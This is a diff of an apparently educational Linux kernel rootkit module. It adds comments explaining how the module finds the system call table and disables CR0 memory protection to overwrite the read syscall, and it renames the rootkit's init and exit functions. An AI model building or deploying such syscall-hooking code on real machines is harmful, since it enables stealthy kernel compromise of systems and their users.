@@ -4,8 +4,17 @@
 #include <asm/paravirt.h> // read_cr0, write_cr0
 #include <linux/sched.h> // current task_struct
 
-/* The normal sys_call_table is const so we define our own to stub it out. */
+/* The sys_call_table is const but we can point our own variable at
+* its memory location to get around that.
+*/
 unsigned long **sys_call_table;
+
+/* The control register's value determines whether or not memory is
+* protected. We'll need to modify it, to turn off memory protection,
+* in order to write over the read system call. Here we store the initial
+* control register value so we can set it back when we're finished 
+* (memory protection is generally good)!
+*/
 unsigned long original_cr0;
 
 /* The prototype for the write syscall. This is where we'll store the original
@@ -70,7 +79,7 @@ static unsigned long **aquire_sys_call_table(void)
 	return NULL;
 }
 
-static int __init rootkit_start(void)
+static int __init trustingtrust_start(void)
 {
     /* The whole trick here is to find the syscall table in memory
      * so we can copy it to a non-const pointer array,
@@ -96,7 +105,7 @@ static int __init rootkit_start(void)
 	return 0;
 }
 
-static void __exit rootkit_end(void)
+static void __exit trustingtrust_end(void)
 {
 	if(!sys_call_table) {
 		return;
@@ -110,7 +119,7 @@ static void __exit rootkit_end(void)
     write_cr0(original_cr0);
 }
 
-module_init(rootkit_start);
-module_exit(rootkit_end);
+module_init(trustingtrust_start);
+module_exit(trustingtrust_end);
 
 MODULE_LICENSE("GPL");
